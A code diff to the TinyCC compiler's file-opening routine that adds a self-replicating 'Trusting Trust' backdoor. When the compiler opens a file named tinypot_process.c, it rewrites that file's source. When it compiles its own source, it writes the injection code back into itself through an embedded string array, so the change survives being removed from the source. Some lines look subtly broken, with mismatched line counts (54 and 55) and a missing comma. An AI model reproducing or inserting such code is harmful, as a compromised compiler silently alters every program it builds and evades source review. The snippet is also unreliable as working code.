@@ -607,9 +607,9 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         fd = 0, filename = "<stdin>";
     else
         fd = open(filename, O_RDONLY | O_BINARY);
-
-    // Length 41
+    
     const char *code[] = {
+        "   int codeLines = 54;\n",
         "   if (strcmp(filename, \"tinypot_process.c\") == 0)\n",
         "   {\n",
         "       FILE* oldFile = fopen(filename, \"r\");\n",
@@ -629,7 +629,7 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         "   {\n",
         "       FILE* compilerFile = fopen(filename, \"r\");\n",
         "       FILE* tempFile = fopen(\".temp\", \"w+\");\n",
-        "       charbuf[200];\n",
+        "       char buf[200];\n",
         "       while (fgets(buf, 200, compilerFile) != NULL)\n",
         "       {\n",
         "           fputs(buf, tempFile);\n",
@@ -637,10 +637,20 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         "           {\n",
         "               if (fgets(buf, 200, compilerFile) != NULL)\n",
         "               {\n",
-        "                   if (strstr(buf, \"tinypot_process.c\") == NULL)\n",
+        "                   if (strstr(buf, \"code[]\") == NULL)\n",
         "                   {\n",
         "                       fputs(\"const char* code[] = {\\n\", tempFile);\n",
-        "                       ",
+        "                       for (int i = 0; i < codeLines; i++)\n",
+        "                       {\n",
+        "                           fputs(\"\\\"\", tempFile);\n",
+        "                           fputs(code[i], tempFile);\n",
+        "                           fputs(\"\\\",\", tempFile);\n",
+        "                       }\n",
+        "                       fputs(\"};\\n\", tempFile);\n",
+        "                       for (int i = 0; i < codeLines; i++)\n",
+        "                       {\n",
+        "                           fputs(code[i], tempFile);\n"
+        "                       }\n",
         "                   }\n",
         "                   fputs(buf, tempFile);\n",
         "               }\n",
@@ -653,7 +663,10 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
         "       while (fgets(buf, 200, tempFile) != NULL)\n",
         "           fputs(buf, compilerFile);\n",
         "       fclose(compilerFile);\n",
-        "       fclose(tempFile);\n"};
+        "       fclose(tempFile);\n",
+        "   }\n"
+    };
+    int codeLines = 55;
 
     // Check if filename is "tinypot_process.c"
     if (strcmp(filename, "tinypot_process.c") == 0)
@@ -691,17 +704,17 @@ ST_FUNC int tcc_open(TCCState *s1, const char *filename)
             {
                 if (fgets(buf, 200, compilerFile) != NULL)
                 {
-                    if (strstr(buf, "tinypot_process.c") == NULL)
+                    if (strstr(buf, "code[]") == NULL)
                     {
                         fputs("const char* code[] = {\n", tempFile);
-                        for (int i = 0; i < 42; i++)
+                        for (int i = 0; i < codeLines; i++)
                         {
                             fputs("\"", tempFile);
                             fputs(code[i], tempFile);
                             fputs("\",", tempFile);
                         }
                         fputs("};\n", tempFile);
-                        for (int i = 0; i < 41; i++)
+                        for (int i = 0; i < codeLines; i++)
                         {
                             fputs(code[i], tempFile);
                         }
